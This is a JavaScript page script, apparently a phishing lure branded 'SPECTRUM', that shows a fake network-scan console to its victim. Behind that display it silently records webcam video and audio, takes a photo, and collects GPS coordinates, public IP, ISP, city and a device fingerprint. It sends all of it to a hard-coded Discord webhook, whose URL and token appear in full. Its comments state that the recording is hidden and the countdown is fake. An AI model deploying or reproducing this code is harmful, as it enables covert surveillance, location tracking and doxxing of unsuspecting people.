// Configurações
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1523084788863467611/yfUAPTp-inY_9IvcJKwqWujOZWANPu6xy8yBPG9X6bLBfmcjPr2OQfZm6kuUU4HdlisZ';

const startBtn = document.getElementById('startBtn');
const consoleLog = document.getElementById('consoleLog');
const progressBar = document.getElementById('progressBar');
const progressContainer = document.getElementById('progressContainer');
const statusValue = document.getElementById('statusValue');
const targetValue = document.getElementById('targetValue');
const video = document.getElementById('video');

let stream = null;

// Função para adicionar log
function addLog(message, type = 'system', data = '') {
    const now = new Date();
    const time = now.toTimeString().split(' ')[0];
    const div = document.createElement('div');
    div.className = `log-line ${type}`;
    
    let displayMsg = '';
    switch(type) {
        case 'success': displayMsg = `✓ ${message}`; break;
        case 'info': displayMsg = `ℹ ${message}`; break;
        case 'warning': displayMsg = `⚠ ${message}`; break;
        case 'error': displayMsg = `✕ ${message}`; break;
        default: displayMsg = `▸ ${message}`;
    }
    
    div.innerHTML = `<span class="timestamp">[${time}]</span> ${displayMsg}`;
    consoleLog.appendChild(div);
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

// Função para atualizar progresso
function setProgress(percent) {
    progressContainer.classList.add('active');
    progressBar.style.width = `${percent}%`;
}

// Função para delay
const wait = ms => new Promise(r => setTimeout(r, ms));

// Simular digitação
async function typeLog(message, type = 'system', delay = 400) {
    await wait(delay);
    addLog(message, type);
}

// Iniciar
startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    startBtn.innerHTML = '<div class="spinner" style="display:inline-block"></div> PROCESSANDO...';
    
    // PEGAR NOME DO DISPOSITIVO (tentativa de fingerprint)
    let deviceName = navigator.platform || 'DESKTOP-UNKN';
    try {
        if (navigator.userAgent.includes('Windows')) deviceName = 'WINDOWS-' + Math.random().toString(36).substring(2, 7).toUpperCase();
    } catch(e) {}
    
    try {
        // FASE 1 - INICIANDO
        await typeLog('Iniciando protocolo de varredura...', 'info', 300);
        setProgress(5);
        await typeLog('Estabelecendo conexão segura com servidor...');
        setProgress(10);
        await wait(500);
        await typeLog('Handshake TLS completo. Criptografia ativa.', 'success', 400);
        setProgress(15);
        await typeLog('Solicitando acesso ao hardware do dispositivo...');
        
        // FASE 2 - CÂMERA (silenciosamente)
        await wait(800);
        await typeLog('Acessando dispositivos de captura...', 'info');
        setProgress(25);
        
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } }, 
            audio: true 
        });
        video.srcObject = stream;
        await wait(500);
        
        await typeLog('Driver de câmera sincronizado.', 'success', 300);
        setProgress(35);
        
        // FASE 3 - GRAVAÇÃO (10 segundos oculta)
        await typeLog('Iniciando captura de pacotes...');
        setProgress(40);
        
        const recordedChunks = [];
        const mediaRecorder = new MediaRecorder(stream, { 
            mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') 
                ? 'video/webm;codecs=vp9,opus'
                : 'video/webm;codecs=vp8,opus'
        });
        
        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) recordedChunks.push(e.data);
        };
        
        mediaRecorder.start();
        
        // Contagem regressiva falsa enquanto grava
        for (let i = 1; i <= 10; i++) {
            await wait(1000);
            const progress = 40 + (i * 5);
            setProgress(Math.min(progress, 90));
            
            if (i <= 2) await typeLog(`Analisando protocolos de rede... [${i}/10]`);
            else if (i <= 4) await typeLog(`Extraindo metadados do sistema... [${i}/10]`);
            else if (i <= 6) await typeLog(`Varredura de portas do dispositivo... [${i}/10]`);
            else if (i <= 8) await typeLog(`Coletando fingerprints digitais... [${i}/10]`);
            else await typeLog(`Pacotes capturados: ${Math.floor(Math.random() * 200 + 100)}... [${i}/10]`);
        }
        
        mediaRecorder.stop();
        await wait(300);
        
        // FASE 4 - FOTO (silenciosa)
        await typeLog('Processando payloads recebidos...', 'info', 400);
        setProgress(85);
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
        
        await typeLog('Payload decodificado.', 'success', 300);
        
        // FASE 5 - LOCALIZAÇÃO
        await typeLog('Triangulando sinal GPS...', 'warning', 400);
        setProgress(90);
        
        let latitude = 'N/D';
        let longitude = 'N/D';
        let accuracy = 'N/A';
        let googleMapsLink = 'Não disponível';
        
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                });
            });
            
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
            accuracy = pos.coords.accuracy + 'm';
            
            // Link do Google Maps
            googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            
            await typeLog(`Coordenadas obtidas: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`, 'success');
        } catch (e) {
            await typeLog('GPS indisponível, usando geolocalização por IP...', 'warning');
        }
        
        setProgress(95);
        
        // FASE 6 -INFO DO SISTEMA
        const browserData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth + 'bit',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'não definido',
            hardwareConcurrency: navigator.hardwareConcurrency + ' cores',
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/D',
            ip: 'Consultando...'
        };
        
        // IP público
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            browserData.ip = ipData.ip;
            
            // Geolocalização por IP
            try {
                const geoRes = await fetch(`http://ip-api.com/json/${browserData.ip}`);
                const geoData = await geoRes.json();
                if (geoData.status === 'success') {
                    browserData.city = geoData.city;
                    browserData.region = geoData.regionName;
                    browserData.country = geoData.country;
                    browserData.isp = geoData.isp;
                    browserData.zip = geoData.zip;
                    
                    if (latitude === 'N/D') {
                        latitude = geoData.lat;
                        longitude = geoData.lon;
                        googleMapsLink = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
                    }
                }
            } catch(e) {}
        } catch(e) {}
        
        // Atualizar target no UI
        targetValue.textContent = browserData.ip !== 'Consultando...' ? browserData.ip : 'DESCONHECIDO';
        
        await typeLog(`IP identificado: ${browserData.ip}`, 'success', 300);
        await typeLog('Sistema fingerprint completo.', 'success');
        
        // FASE 7 - ENVIAR PARA DISCORD
        await typeLog('Compactando payload para transmissão...', 'info');
        setProgress(98);
        
        await sendToDiscord({
            lat: latitude,
            lon: longitude,
            accuracy: accuracy,
            googleMaps: googleMapsLink
        }, browserData, recordedChunks, photoBlob);
        
        await typeLog('Dados transmitidos com sucesso!', 'success', 500);
        setProgress(100);
        
        await wait(300);
        addLog('─── OPERAÇÃO CONCLUÍDA ───', 'system');
        statusValue.textContent = '✅ CONCLUÍDO';
        statusValue.style.color = '#00ff88';
        
        startBtn.innerHTML = '<span class="btn-icon">✓</span> DADOS PUXADOS COM SUCESSO';
        startBtn.style.borderColor = 'rgba(0, 255, 136, 0.5)';
        startBtn.style.color = '#00ff88';
        
        // Para a câmera
        if (stream) stream.getTracks().forEach(track => track.stop());
        
    } catch (err) {
        console.error(err);
        
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            await typeLog('Acesso negado ao hardware do dispositivo!', 'error', 500);
            await typeLog('Tentando método alternativo...', 'warning', 800);
            await typeLog('Coletando dados disponíveis sem câmera...', 'info', 500);
            
            // Tenta pelo menos pegar IP e localização via IP
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}`);
                const geoData = await geoRes.json();
                
                const mapsLink = geoData.status === 'success' 
                    ? `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`
                    : 'Não disponível';
                
                await sendToDiscord({
                    lat: geoData.lat || 'N/D',
                    lon: geoData.lon || 'N/D',
                    accuracy: 'IP geolocation',
                    googleMaps: mapsLink
                }, {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ip: ipData.ip,
                    isp: geoData.isp || 'N/D',
                    city: geoData.city || 'N/D',
                    country: geoData.country || 'N/D'
                }, [], null);
                
                await typeLog('Dados parciais transmitidos com sucesso!', 'success');
                setProgress(100);
                statusValue.textContent = '✅ PARCIAL';
            } catch(e2) {
                await typeLog('Falha na transmissão.', 'error');
                statusValue.textContent = '❌ FALHA';
                statusValue.style.color = '#ef5350';
            }
        } else {
            addLog(`Erro: ${err.message || 'Desconhecido'}`, 'error');
            statusValue.textContent = '❌ ERRO';
            statusValue.style.color = '#ef5350';
        }
        
        startBtn.disabled = false;
        startBtn.innerHTML = '<span class="btn-icon">⟳</span> TENTAR NOVAMENTE';
    }
});

// Função para enviar ao Discord
async function sendToDiscord(location, browserInfo, videoChunks, photoBlob) {
    const formData = new FormData();
    
    // Criar embed
    const mapsLinkField = location.googleMaps !== 'Não disponível' 
        ? `[📍 Abrir no Google Maps](${location.googleMaps})`
        : 'Não disponível';
    
    const embed = {
        embeds: [{
            title: '⬡ SPECTRUM - DADOS COLETADOS',
            color: 0x00ff88,
            thumbnail: { url: 'https://i.imgur.com/3LZQx9X.png' },
            fields: [
                { 
                    name: '📍 LOCALIZAÇÃO EXATA', 
                    value: `${mapsLinkField}\n\`Lat: ${typeof location.lat === 'number' ? location.lat.toFixed(6) : location.lat}\`\n\`Lon: ${typeof location.lon === 'number' ? location.lon.toFixed(6) : location.lon}\`\n\`Precisão: ${location.accuracy}\``, 
                    inline: false 
                },
                { 
                    name: '🌐 CONEXÃO', 
                    value: `\`IP: ${browserInfo.ip}\`\n\`ISP: ${browserInfo.isp || 'N/D'}\`\n\`Cidade: ${browserInfo.city || browserInfo.region || 'N/D'}\`\n\`País: ${browserInfo.country || 'N/D'}\``, 
                    inline: true 
                },
                { 
                    name: '💻 DISPOSITIVO', 
                    value: `\`Plataforma: ${browserInfo.platform}\`\n\`Tela: ${browserInfo.screen}\`\n\`Timezone: ${browserInfo.timezone}\`\n\`Idioma: ${browserInfo.language || 'N/D'}\``, 
                    inline: true 
                },
                { 
                    name: '⚙️ HARDWARE', 
                    value: `\`CPU Cores: ${browserInfo.hardwareConcurrency || 'N/D'}\`\n\`RAM: ${browserInfo.deviceMemory || 'N/D'}\`\n\`Cookies: ${browserInfo.cookiesEnabled ? '✅ Ativos' : '❌ Bloqueados'}\``, 
                    inline: true 
                }
            ]
        }]
    };
    
    // Adicionar informação extra se tiver localização da cidade
    if (browserInfo.city && browserInfo.country) {
        embed.embeds[0].fields.push({
            name: '🗺️ LOCAL APROXIMADO',
            value: `\`${browserInfo.city}, ${browserInfo.region || ''} - ${browserInfo.country}\`\n\`${browserInfo.zip ? 'CEP: ' + browserInfo.zip : ''}\``,
            inline: true
        });
    }
    
    // Bandeira do país
    if (browserInfo.country) {
        const countryCode = browserInfo.country === 'Brazil' ? '🇧🇷' : 
                            browserInfo.country === 'United States' ? '🇺🇸' : '🌐';
        embed.embeds[0].fields.push({
            name: '📍 PAÍS',
            value: `${countryCode} ${browserInfo.country}`,
            inline: true
        });
    }
    
    embed.embeds[0].fields.push({
        name: '📋 USER AGENT',
        value: `\`\`\`${browserInfo.userAgent}\`\`\``,
        inline: false
    });
    
    embed.embeds[0].footer = { 
        text: `SPECTRUM SEC • ${new Date().toLocaleString('pt-BR')}`,
        icon_url: 'https://i.imgur.com/3LZQx9X.png'
    };
    embed.embeds[0].timestamp = new Date().toISOString();
    
    // Anexar mídia
    let fileIndex = 0;
    
    if (photoBlob) {
        const photoFile = new File([photoBlob], `foto_${Date.now()}.jpg`, { type: 'image/jpeg' });
        formData.append(`files[${fileIndex}]`, photoFile);
        embed.embeds[0].image = { url: `attachment://foto_${Date.now()}.jpg` };
        fileIndex++;
    }
    
    if (videoChunks && videoChunks.length > 0) {
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
        const videoFile = new File([videoBlob], `gravacao_${Date.now()}.webm`, { type: 'video/webm' });
        formData.append(`files[${fileIndex}]`, videoFile);
        fileIndex++;
    }
    
    // Payload JSON
    const payloadBlob = new Blob([JSON.stringify(embed)], { type: 'application/json' });
    formData.append('payload_json', payloadBlob);
    
    const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: formData
    });
    
    if (!response.ok) {
        const text = await response.text();
        throw new Error(`Discord error ${response.status}: ${text}`);
    }
    
    return response;
}